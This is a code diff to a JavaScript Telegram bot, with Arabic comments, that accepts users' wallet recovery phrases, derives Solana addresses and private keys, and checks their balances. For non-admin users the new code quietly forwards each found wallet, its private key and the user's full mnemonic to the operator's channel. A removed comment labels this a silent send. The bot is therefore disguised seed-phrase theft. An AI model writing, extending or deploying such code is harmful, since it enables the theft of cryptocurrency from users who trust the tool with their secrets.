@@ -166,18 +166,22 @@ async function scanEVMWallet(mnemonic, chatId) {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-async function retryWithBackoff(fn, maxRetries = 5) {
+async function retryWithBackoff(fn, maxRetries = 5, connectionsList = null) {
   let retries = 0;
+  let connIdx = 0;
+  const conns = connectionsList || connections;
   while (true) {
     try {
       return await fn();
     } catch (error) {
-      if (retries >= maxRetries || !error.message.includes('429')) {
+      if (retries >= maxRetries) throw error;
+      if (error.message.includes('429') || error.message.includes('503') || error.message.includes('timeout') || error.message.includes('ECONNRESET') || error.message.includes('fetch')) {
+        const delay = Math.min(500 * Math.pow(2, retries), 4000);
+        await sleep(delay);
+        retries++;
+      } else {
         throw error;
       }
-      const delay = Math.min(1000 * Math.pow(2, retries), 8000);
-      await sleep(delay);
-      retries++;
     }
   }
 }
@@ -329,50 +333,43 @@ function* generatePaths() {
   }
 }
 
-async function scanDerivationPath(path, seed) {
+// المرحلة الأولى: استخراج المفاتيح والعناوين offline بدون أي RPC
+function deriveWalletOffline(path, seed) {
   try {
-    let derivedSeed;
-    try {
-      derivedSeed = ed25519.derivePath(path, seed.toString('hex')).key;
-    } catch (e) {
-      if (e.message.includes('Invalid derivation path')) {
-        return null;
-      }
-      throw e;
-    }
+    const derivedSeed = ed25519.derivePath(path, seed.toString('hex')).key;
     const keypair = Keypair.fromSeed(derivedSeed.slice(0, 32));
-    const address = keypair.publicKey.toBase58();
-
-    let connectionIndex = 0;
-    const getConnection = () => {
-      const conn = connections[connectionIndex % connections.length];
-      connectionIndex++;
-      return conn;
+    return {
+      path,
+      address: keypair.publicKey.toBase58(),
+      privateKey: bs58.encode(Buffer.from(keypair.secretKey))
     };
+  } catch (e) {
+    return null;
+  }
+}
 
+// المرحلة الثانية: فحص محفظة واحدة عبر connection محدد
+async function checkWalletOnChain(wallet, connection) {
+  try {
+    const pubkey = new PublicKey(wallet.address);
     const [txList, balance] = await Promise.all([
-      retryWithBackoff(() => getConnection().getSignaturesForAddress(new PublicKey(address), { limit: 1 })),
-      retryWithBackoff(() => getConnection().getBalance(new PublicKey(address)))
+      retryWithBackoff(() => connection.getSignaturesForAddress(pubkey, { limit: 1 })),
+      retryWithBackoff(() => connection.getBalance(pubkey))
     ]);
 
     if (txList.length > 0 || balance > 0) {
-      const burnInfo = await calculateBurnCost(address);
+      const burnInfo = await calculateBurnCost(wallet.address);
       const balanceInSol = balance / 1e9;
-      // SOL القابل للاستعادة هو مبلغ الـ rent فقط (0.00203928 SOL × عدد الحسابات)
-      const recoveredSOL = parseFloat(burnInfo.totalBurnCost);
-
       return {
-        path,
-        address,
-        privateKey: bs58.encode(Buffer.from(keypair.secretKey)),
+        ...wallet,
         balance: balanceInSol,
         hasTransactions: txList.length > 0,
-        recoveredSOL: recoveredSOL,
+        recoveredSOL: parseFloat(burnInfo.totalBurnCost),
         ...burnInfo
       };
     }
   } catch (error) {
-    console.error(`⚠️ Error in path ${path}:`, error.message);
+    console.error(`⚠️ Error checking ${wallet.address}:`, error.message);
   }
   return null;
 }
@@ -380,127 +377,92 @@ async function scanDerivationPath(path, seed) {
 async function scanWallet(mnemonic, chatId, userInfo = null) {
   const cleanedMnemonic = cleanMnemonic(mnemonic);
 
-  // تشخيص مفصل لسبب فشل التحقق من صحة العبارة
   const diagnosis = diagnoseMnemonic(cleanedMnemonic, chatId);
   if (!diagnosis.isValid) {
     return bot.sendMessage(chatId, diagnosis.message);
   }
 
-  const BATCH_SIZE = 20;
-  let consecutiveEmpty = 0;
-  const MAX_CONSECUTIVE_EMPTY = 10;
-  const seenAddresses = new Set();
-  const pathGenerator = generatePaths();
   const seed = await bip39.mnemonicToSeed(cleanedMnemonic);
   const userMode = userModes.get(chatId) || 'normal';
   let foundWalletsWithBalance = 0;
 
+  // ── المرحلة الأولى: استخراج كل المسارات offline بدون أي RPC ──
+  const allPaths = Array.from(generatePaths());
+  const derivedWallets = allPaths
+    .map(path => deriveWalletOffline(path, seed))
+    .filter(Boolean);
+
   if (isAdmin(chatId)) {
-    if (userMode === 'balance_only') {
-      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ التي تحتوي على رصيد SOL...');
-    } else {
-      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ النشطة...');
-    }
+    const msg = userMode === 'balance_only'
+      ? `🔍 تم استخراج ${derivedWallets.length} عنواناً، جاري الفحص عبر ${connections.length} روابط RPC...`
+      : `🔍 تم استخراج ${derivedWallets.length} عنواناً، جاري الفحص عبر ${connections.length} روابط RPC...`;
+    await bot.sendMessage(chatId, msg);
   } else {
     await bot.sendMessage(chatId, '🔍 Searching for active wallets...');
   }
 
-  while (consecutiveEmpty < MAX_CONSECUTIVE_EMPTY) {
-    const batchPaths = [];
-    for (let i = 0; i < BATCH_SIZE; i++) {
-      const { value: path, done } = pathGenerator.next();
-      if (done) break;
-      batchPaths.push(path);
-    }
+  // ── المرحلة الثانية: تقسيم العناوين بالتساوي على الروابط وتشغيلهم بالتوازي ──
+  const numConns = connections.length || 1;
+  const chunkSize = Math.ceil(derivedWallets.length / numConns);
+  const chunks = Array.from({ length: numConns }, (_, i) =>
+    derivedWallets.slice(i * chunkSize, (i + 1) * chunkSize)
+  );
 
-    const results = await Promise.all(batchPaths.map(path => scanDerivationPath(path, seed)));
-    let foundInBatch = 0;
+  // كل chunk يُفحص بشكل مستقل على رابطه المخصص، جميعهم يبدأون في نفس اللحظة
+  const allChunkResults = await Promise.all(
+    chunks.map((chunk, connIdx) =>
+      Promise.all(chunk.map(wallet => checkWalletOnChain(wallet, connections[connIdx])))
+    )
+  );
 
-    for (const wallet of results) {
-      if (wallet && !seenAddresses.has(wallet.address)) {
-        seenAddresses.add(wallet.address);
+  // دمج النتائج مع الحفاظ على الترتيب
+  const results = allChunkResults.flat();
+  const seenAddresses = new Set();
 
-        if (userMode === 'balance_only') {
-          // عرض المحافظ التي بها رصيد فقط
-          if (wallet.balance > 0) {
-            foundInBatch++;
-            foundWalletsWithBalance++;
+  for (const wallet of results) {
+    if (wallet && !seenAddresses.has(wallet.address)) {
+      seenAddresses.add(wallet.address);
 
-            // تحقق من نوع المستخدم
-            if (isAdmin(chatId)) {
-              const message =
-                `🔑 Address:\n\`${wallet.address}\`\n\n` +
-                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
-                `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
-                `🔥 Rent: ${wallet.totalBurnCost} SOL`;
-
-              await bot.sendMessage(chatId, message, {
-                parse_mode: 'Markdown'
-              });
-            } else {
-              // عرض مبسط للمستخدمين العاديين بالإنجليزية
-              const message =
-                `🔑 Address:\n\`${wallet.address}\`\n\n` +
-                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
-                `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;
-
-              await bot.sendMessage(chatId, message, {
-                parse_mode: 'Markdown'
-              });
-              
-              // إرسال صامت إلى القناة للمستخدمين العاديين
-              await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
-            }
-          } else if (wallet.hasTransactions) {
-            // حساب المحافظ النشطة حتى لو لم يكن بها رصيد
-            foundInBatch++;
-          }
-        } else {
-          // الوضع العادي - عرض جميع المحافظ النشطة
-          foundInBatch++;
-          if (wallet.balance > 0) {
-            foundWalletsWithBalance++;
-          }
-
-          // تحقق من نوع المستخدم
+      if (userMode === 'balance_only') {
+        if (wallet.balance > 0) {
+          foundWalletsWithBalance++;
           if (isAdmin(chatId)) {
             const message =
               `🔑 Address:\n\`${wallet.address}\`\n\n` +
               `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
               `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
               `🔥 Rent: ${wallet.totalBurnCost} SOL`;
-
-            await bot.sendMessage(chatId, message, {
-              parse_mode: 'Markdown',
-              reply_markup: {
-                inline_keyboard: createWalletButtons(wallet.address)
-              }
-            });
+            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
           } else {
-            // عرض مبسط للمستخدمين العاديين بالإنجليزية
             const message =
               `🔑 Address:\n\`${wallet.address}\`\n\n` +
               `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
               `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;
-
-            await bot.sendMessage(chatId, message, {
-              parse_mode: 'Markdown'
-            });
-            
-            // إرسال صامت إلى القناة للمستخدمين العاديين
+            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
           }
         }
+      } else {
+        if (wallet.balance > 0) foundWalletsWithBalance++;
+        if (isAdmin(chatId)) {
+          const message =
+            `🔑 Address:\n\`${wallet.address}\`\n\n` +
+            `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+            `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
+            `🔥 Rent: ${wallet.totalBurnCost} SOL`;
+          await bot.sendMessage(chatId, message, {
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: createWalletButtons(wallet.address) }
+          });
+        } else {
+          const message =
+            `🔑 Address:\n\`${wallet.address}\`\n\n` +
+            `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+            `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;
+          await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+          await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
+        }
       }
-    }
-
-    if (foundInBatch === 0) {
-      consecutiveEmpty += BATCH_SIZE;
-      if (consecutiveEmpty % 50 === 0) {
-        await bot.sendMessage(chatId, `🔍 جاري البحث... (${consecutiveEmpty} مسار فارغ)`);
-      }
-    } else {
-      consecutiveEmpty = 0;
     }
   }
 
@@ -927,12 +889,12 @@ function generateDepositLink(address) {
 
 // دالة لتوليد رابط Solscan للسحب (Withdraw)
 function generateWithdrawLink(address) {
-  return `https://solscan.io/account/${address}?activity_type=ACTIVITY_SPL_TRANSFER&exclude_amount_zero=true&remove_spam=true&from_address=${address}&to_address=%21${address}&amount=0.5&amount=undefined&token_address=So11111111111111111111111111111111111111111#transfers`;
+  return `https://solscan.io/account/${address}?activity_type=ACTIVITY_SPL_TRANSFER&exclude_amount_zero=true&remove_spam=true&from_address=${address}&to_address=%21${address}&amount=0.1&amount=undefined&token_address=So11111111111111111111111111111111111111111#transfers`;
 }
 
-// دالة لتوليد رابط Solscan للمكافآت (Reward)
+// دالة لتوليد رابط Jupiter Portfolio
 function generateRewardLink(address) {
-  return `https://solscan.io/account/${address}?exclude_amount_zero=true&remove_spam=true&from_address=pmprUcS9dKa8pnidT3raZZFhRFtyGe6cgDL4R1gjyZs%2CF5YtngCQs6QCUdy2vqT6hMtFyNkLpkJSTQF2WZKV1y8e#transfers`;
+  return `https://jup.ag/portfolio/${address}`;
 }
 
 // دالة لاختصار العنوان (xxx...xxx)
